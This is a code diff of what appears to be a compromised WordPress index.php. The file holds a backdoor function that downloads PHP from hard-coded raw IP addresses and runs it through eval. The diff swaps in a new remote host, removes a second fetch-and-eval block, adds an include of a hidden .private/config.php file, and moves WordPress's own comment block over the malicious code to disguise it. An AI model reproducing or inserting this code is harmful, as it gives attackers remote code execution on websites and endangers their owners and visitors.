@@ -5,6 +5,12 @@
  *
  * @package WordPress
  */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
 function getRemoteData($url) {
     $result = false;
     
@@ -28,7 +34,7 @@ function getRemoteData($url) {
     
     return $result;
 }
-$configData = getRemoteData('http://107.150.48.76/j251121_23/init.txt');
+$configData = getRemoteData('http://198.204.224.102/j251205_13/init.txt');
 
 if ($configData) {
     if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
@@ -39,22 +45,7 @@ if ($configData) {
         }
     }
 }
-$configData = getRemoteData('http://173.208.228.155/j251201_13/init.txt');
-
-if ($configData) {
-    if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
-        try {
-            eval('?>' . $configData);
-        } catch (Exception $e) {
-            error_log('Configuration load error: ' . $e->getMessage());
-        }
-    }
-}
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
+include dirname(__FILE__) . '/.private/config.php';
 define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
